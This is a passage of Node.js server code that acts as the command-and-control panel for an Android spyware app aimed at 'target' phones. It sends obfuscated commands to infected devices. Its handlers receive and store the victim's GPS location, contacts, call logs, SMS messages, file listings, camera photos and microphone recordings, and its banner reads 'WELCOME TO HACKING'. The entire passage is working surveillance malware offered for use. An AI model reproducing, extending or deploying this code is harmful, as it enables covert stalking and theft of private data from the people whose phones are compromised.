        payload = { order: 'x0000mc', sec: parseInt(extra) || 10 };
    } else {
        payload = { order: order, extra: extra };
    }

    socket.emit('order', payload);
    addLog(`➡️ Command Sent to Target: ${JSON.stringify(payload)}`);
    res.redirect(`/admin${selected ? '?selected=' + selected : ''}`);
});

// Socket.IO Connection Handler for Target Phone APK
io.on('connection', (socket) => {
    const handshake = socket.handshake;
    const query = handshake.query || {};
    const clientIp = handshake.headers['x-forwarded-for'] || handshake.address;

    const deviceId = (query.id && query.id !== 'Unknown ID' && query.id !== 'null') ? query.id : 'device_' + (query.model || 'generic').replace(/[^a-zA-Z0-9]/g, '');
    const deviceKey = deviceId;

    if (deviceTimeouts.has(deviceKey)) {
        clearTimeout(deviceTimeouts.get(deviceKey));
        deviceTimeouts.delete(deviceKey);
    }

    const deviceObj = {
        key: deviceKey,
        socketId: socket.id,
        id: deviceId,
        model: query.model || 'Android Phone',
        manf: query.manf || 'Generic',
        release: query.release || 'Android OS',
        ip: clientIp,
        country: 'India',
        date: new Date().toLocaleDateString(),
        time: new Date().toLocaleTimeString(),
        status: 'ONLINE'
    };

    devicesMap.set(deviceKey, deviceObj);
    const store = getDeviceStore(deviceKey);

    addLog(`📱 Target Connected: ${deviceObj.model} (${deviceObj.manf}) [IP: ${clientIp}]`);

    socket.on('ping', () => {
        socket.emit('pong');
    });

    // 1. Location Received Handler
    socket.on('x0000lm', (data) => {
        store.location = data;
        if (data.enable) {
            addLog(`📍 Location Received: Lat ${data.lat}, Lng ${data.lng}`);
        } else {
            addLog(`⚠️ Target Location: GPS is OFF on phone`, 'warning');
        }
        io.emit('data_arrived');
    });

    // 2. Contacts Received Handler
    socket.on('x0000cn', (data) => {
        if (data && data.contactsList) {
            store.contacts = data.contactsList;
            addLog(`👤 Contacts Received: ${data.contactsList.length} contacts found`);
        } else {
            store.contacts = data;
            addLog(`👤 Contacts Data Received`);
        }
        io.emit('data_arrived');
    });

    // 3. Call Logs Received Handler
    socket.on('x0000cl', (data) => {
        if (data && data.callsList) {
            store.callLogs = data.callsList;
            addLog(`📞 Call Logs Received: ${data.callsList.length} calls found`);
        } else {
            store.callLogs = data;
            addLog(`📞 Call Logs Data Received`);
        }
        io.emit('data_arrived');
    });

    // 4. SMS Received Handler
    socket.on('x0000sm', (data) => {
        if (data && data.smsList) {
            store.smsList = data.smsList;
            addLog(`💬 SMS Inbox Received: ${data.smsList.length} messages found`);
        } else {
            store.smsList = data;
            addLog(`💬 SMS Data Received`);
        }
        io.emit('data_arrived');
    });

    // 5. File Manager Received Handler
    socket.on('x0000fm', (data) => {
        if (data && data.list) {
            store.fileList = data.list;
            addLog(`📁 File Directory Received: ${data.list.length} files/folders`);
        } else {
            addLog(`📁 File Data Received`);
        }
        io.emit('data_arrived');
    });

    // 6. Camera Photo Received Handler
    socket.on('x0000ca', (data) => {
        if (data && (data.buffer || data.image)) {
            const b64 = bufferToBase64(data.buffer);
            store.photos.unshift({
                name: data.name || 'photo_' + Date.now() + '.jpg',
                base64: b64,
                time: new Date().toLocaleTimeString()
            });
            addLog(`📷 Photo Captured Successfully!`);
        } else {
            addLog(`📷 Camera Data Received`);
        }
        io.emit('data_arrived');
    });

    // 7. Mic Audio Received Handler
    socket.on('x0000mc', (data) => {
        if (data && (data.buffer || data.file)) {
            const b64 = bufferToBase64(data.buffer);
            store.audioRecordings.unshift({
                name: data.name || 'audio_' + Date.now() + '.mp3',
                base64: b64,
                time: new Date().toLocaleTimeString()
            });
            addLog(`🎙️ Mic Audio Recording Received & Ready to Play!`);
        } else {
            addLog(`🎙️ Audio Data Received`);
        }
        io.emit('data_arrived');
    });

    socket.on('disconnect', () => {
        const timeoutId = setTimeout(() => {
            if (devicesMap.has(deviceKey)) {
                devicesMap.get(deviceKey).status = 'OFFLINE';
                addLog(`🔌 Target Phone Went Offline / Slept: ${deviceObj.model}`);
            }
            deviceTimeouts.delete(deviceKey);
        }, 45000);

        deviceTimeouts.set(deviceKey, timeoutId);
    });
});

const PORT = process.env.PORT || 40474;
server.listen(PORT, () => {
    console.log(`[🚀] WELCOME TO HACKING Server running on port ${PORT}`);
    console.log(`[🔒] Admin Panel URL: http://localhost:${PORT}/admin (Password: ${ADMIN_PASSWORD})`);
});
